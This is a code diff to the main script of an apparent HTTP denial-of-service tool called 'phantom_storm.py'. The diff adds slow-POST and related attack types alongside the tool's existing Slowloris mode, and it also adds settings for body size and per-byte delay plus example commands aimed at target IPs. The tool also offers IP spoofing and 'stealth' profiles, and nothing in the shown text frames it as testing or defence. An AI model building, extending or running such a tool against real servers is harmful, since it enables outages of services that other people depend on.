@@ -40,6 +40,7 @@ from src import (
 )
 from src.core import AttackProfiles, ProfileType
 from src.core.tls_handler import TLSConfig, TLSHelper
+from src.core.attack_types import AttackType
 
 # ============================================================================
 # BANNER & UI
@@ -169,13 +170,18 @@ def main():
         print(f"  --tls-version=VER  TLS version (TLS_1_0, TLS_1_1, TLS_1_2, TLS_1_3, AUTO)")
         print(f"  --no-spoof         Disable IP spoofing")
         print(f"  --method=METHOD    HTTP method (GET, POST, HEAD, OPTIONS, PUT, DELETE)")
-        print(f"  --random-method    Use random HTTP method for each request\n")
+        print(f"  --random-method    Use random HTTP method for each request")
+        print(f"  --attack-type=TYPE Attack type (slowloris, slow-post)")
+        print(f"  --content-length=N Content-Length for slow POST (default: 1000000)")
+        print(f"  --post-delay=N     Delay between bytes for slow POST in seconds (default: 10.0)\n")
         print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
         print(f"  python phantom_storm.py 192.168.1.100 80 200")
         print(f"  python phantom_storm.py 192.168.1.100 443 200 --https")
         print(f"  python phantom_storm.py 192.168.1.100 443 200 --https --sni=www.example.com")
         print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=stealth")
-        print(f"  python phantom_storm.py 192.168.1.100 443 200 --profile=aggressive --https\n")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --profile=aggressive --https")
+        print(f"  python phantom_storm.py 192.168.1.100 80 200 --attack-type=slow-post")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --attack-type=slow-post --https --content-length=500000 --post-delay=5.0\n")
         sys.exit(1)
     
     target_ip = sys.argv[1]
@@ -193,6 +199,11 @@ def main():
     verify_ssl = False
     tls_version = "AUTO"
     sni_hostname = None
+    
+    # Attack type options
+    attack_type = AttackType.SLOWLORIS  # Default
+    slow_post_size = 1000000            # 1MB default
+    slow_post_delay = 10.0              # 10 seconds per byte default
     
     for arg in sys.argv[4:]:
         if arg.startswith('--profile='):
@@ -248,6 +259,26 @@ def main():
                     sys.exit(1)
             elif arg == '--random-method':
                 randomize_method = True
+            elif arg.startswith('--attack-type='):
+                attack_type_str = arg.split('=')[1].lower()
+                if attack_type_str == 'slowloris':
+                    attack_type = AttackType.SLOWLORIS
+                elif attack_type_str == 'slow-post':
+                    attack_type = AttackType.SLOW_POST
+                elif attack_type_str == 'slow-read':
+                    attack_type = AttackType.SLOW_READ
+                elif attack_type_str == 'range-header':
+                    attack_type = AttackType.RANGE_HEADER
+                elif attack_type_str == 'cache-bypass':
+                    attack_type = AttackType.CACHE_BYPASS
+                else:
+                    print(f"{Colors.FAIL}[ERROR] Invalid attack type: {attack_type_str}{Colors.ENDC}")
+                    print(f"Valid types: slowloris, slow-post, slow-read, range-header, cache-bypass\n")
+                    sys.exit(1)
+            elif arg.startswith('--content-length='):
+                slow_post_size = int(arg.split('=')[1])
+            elif arg.startswith('--post-delay='):
+                slow_post_delay = float(arg.split('=')[1])
     
     # Create TLS config
     tls_config = TLSConfig(
@@ -260,6 +291,17 @@ def main():
     # Display config
     protocol = "HTTPS" if use_https else "HTTP"
     print(f"\n{Colors.OKCYAN}[*] Protocol: {protocol}{Colors.ENDC}")
+    print(f"{Colors.OKCYAN}[*] Attack Type: {attack_type.value.upper()}{Colors.ENDC}")
+    
+    if attack_type == AttackType.SLOW_POST:
+        print(f"{Colors.OKCYAN}[*] Slow POST Content-Length: {slow_post_size:,} bytes{Colors.ENDC}")
+        print(f"{Colors.OKCYAN}[*] Slow POST Byte Delay: {slow_post_delay} seconds{Colors.ENDC}")
+        
+        # Calculate attack duration
+        from src.core.slow_post import SlowPostHelper
+        duration = SlowPostHelper.calculate_attack_duration(slow_post_size, slow_post_delay)
+        duration_str = SlowPostHelper.format_duration(duration)
+        print(f"{Colors.WARNING}[!] Estimated attack duration per connection: {duration_str}{Colors.ENDC}")
     
     if use_https:
         print(f"{Colors.OKCYAN}[*] TLS Version: {tls_version}{Colors.ENDC}")
@@ -334,7 +376,10 @@ def main():
             use_spoofing=use_spoofing,
             http_method=http_method,
             randomize_method=randomize_method,
-            tls_config=tls_config
+            tls_config=tls_config,
+            attack_type=attack_type,
+            slow_post_size=slow_post_size,
+            slow_post_delay=slow_post_delay
         )
         thread = threading.Thread(target=worker.run, daemon=True)
         thread.start()
